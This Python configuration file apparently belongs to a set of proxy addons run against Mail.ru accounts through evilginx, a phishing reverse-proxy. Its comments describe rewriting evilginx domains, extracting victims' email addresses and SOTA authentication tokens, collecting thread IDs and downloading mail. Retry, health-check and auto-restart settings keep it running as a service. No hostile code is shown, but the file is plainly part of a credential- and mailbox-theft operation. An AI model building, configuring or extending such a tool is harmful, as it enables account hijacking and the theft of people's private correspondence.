"""
Configuration file for Mail.ru addons.

This file allows users to configure which addons to enable/disable.
"""

# Addon configuration - set to True to enable, False to disable
ADDON_CONFIG = {
    "url_rewriter": True,  # Fix evilginx domain issues
    "email_extractor": True,  # Extract email from URL parameters
    "auth_extractor": True,  # Extract SOTA tokens from HTML
    "thread_collector": True,  # Collect thread IDs with pagination
    "main_orchestrator": True,  # Coordinate and execute main flow
}

# Alternative configurations for different use cases

# Configuration for only collecting threads (no downloading)
COLLECTION_ONLY_CONFIG = {
    "url_rewriter": True,
    "email_extractor": True,
    "auth_extractor": True,
    "thread_collector": True,
    "main_orchestrator": False,
}

# Configuration for only downloading existing threads
DOWNLOAD_ONLY_CONFIG = {
    "url_rewriter": False,
    "email_extractor": False,
    "auth_extractor": False,
    "thread_collector": False,
    "main_orchestrator": True,
}

# Configuration for minimal functionality (just URL rewriting)
MINIMAL_CONFIG = {
    "url_rewriter": True,
    "email_extractor": False,
    "auth_extractor": False,
    "thread_collector": False,
    "main_orchestrator": False,
}

# Active configuration - change this to use different presets
ACTIVE_CONFIG = ADDON_CONFIG

# Restart and retry configuration
RESTART_CONFIG = {
    "max_retries": 3,
    "retry_delay_base": 60,  # Base delay in seconds
    "retry_delay_multiplier": 2,  # Exponential backoff
    "max_retry_delay": 3600,  # Max 1 hour
    "restart_delay_success": 0,  # Immediate restart on success
    "restart_delay_auth": 300,  # 5 minutes for auth failures
    "restart_delay_errors": 600,  # 10 minutes for too many errors
    "max_execution_time": 86400,  # 24 hours max execution time
    "max_consecutive_errors": 5,
    "rate_limit_duration": 300,  # 5 minutes rate limit duration
    "stuck_threshold": 1800,  # 30 minutes without progress
    "health_check_interval": 300,  # 5 minutes health check interval
}

# Service configuration
SERVICE_CONFIG = {
    "service_name": "mailru-cynosure",
    "enable_health_monitoring": True,
    "enable_auto_restart": True,
    "enable_retry_logic": True,
}
